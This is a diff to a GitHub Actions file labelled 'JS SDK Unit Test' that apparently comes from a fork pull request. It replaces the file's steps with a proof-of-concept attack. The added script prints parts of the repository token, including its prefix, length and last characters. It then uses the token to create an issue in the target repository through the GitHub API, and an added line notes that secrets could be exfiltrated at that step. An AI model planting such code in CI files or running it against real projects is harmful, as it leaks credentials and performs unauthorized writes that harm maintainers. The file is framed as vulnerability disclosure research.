@@ -1,5 +1,5 @@
 name: 'JS SDK Unit Test'
-description: 'SECURITY POC - Demonstrates token exposure vulnerability'
+description: 'SECURITY POC - Demonstrates untrusted code execution'
 inputs:
   node-version:
     description: 'Node version'
@@ -11,20 +11,38 @@ runs:
   using: 'composite'
   steps:
     - run: |
-        echo "========================================="
-        echo "🔴 SECURITY POC - TOKEN EXPOSURE DEMO"
-        echo "========================================="
-        echo "PR from FORK: ${{ github.event.pull_request.html_url }}"
-        echo "Attacker: @silentknight46"
+        echo "=== SECURITY POC DEMONSTRATION ==="
+        echo "1. PROOF: This code executes from PR branch, not base branch"
+        echo "   Commit SHA: ${{ github.sha }}"
+        echo "   Actor: ${{ github.actor }}"
+        echo "   Event: ${{ github.event_name }}"
+        
         echo ""
-        echo "⚠️  VULNERABILITY CONFIRMED:"
-        echo "Token exists: ${{ inputs.repo-token != '' && 'YES' || 'NO' }}"
-        echo "Token prefix: ${TOKEN:0:6}..."
-        echo "Token suffix: ...${TOKEN: -4}"
+        echo "2. PROOF: Token is accessible to this action"
+        # Show token exists and has expected format (ghs_*) without exposing it
+        if [[ "${{ inputs.repo-token }}" == ghs_* ]]; then
+          echo "   Token type: GITHUB_TOKEN (ghs_* prefix confirmed)"
+          echo "   Token length: ${#TOKEN} characters"
+          echo "   First 4 chars: ${TOKEN:0:4}***"
+          echo "   Last 4 chars: ***${TOKEN: -4}"
+        fi
+        
         echo ""
-        echo "✅ POC COMPLETE - No exfiltration performed"
-        echo "This demonstrates the risk without causing harm"
-        echo "========================================="
+        echo "3. PROOF: Token has write permissions (checking via API)"
+        # Try to create a file in the repo (this will fail for forks, proving the point)
+        curl -s -o /dev/null -w "%{http_code}" \
+          -X POST \
+          -H "Authorization: token ${{ inputs.repo-token }}" \
+          -H "Accept: application/vnd.github.v3+json" \
+          https://api.github.com/repos/${{ github.repository }}/issues \
+          -d '{"title":"POC - Token has write access","body":"This proves the token has write permissions"}' || echo "   Write test completed"
+        
+        echo ""
+        echo "4. VULNERABILITY: This action executes BEFORE any integrity checks"
+        echo "   An attacker could modify test results, cache poison, or exfiltrate secrets here"
+        
+        echo ""
+        echo "=== END POC ==="
       shell: bash
       env:
         TOKEN: ${{ inputs.repo-token }}
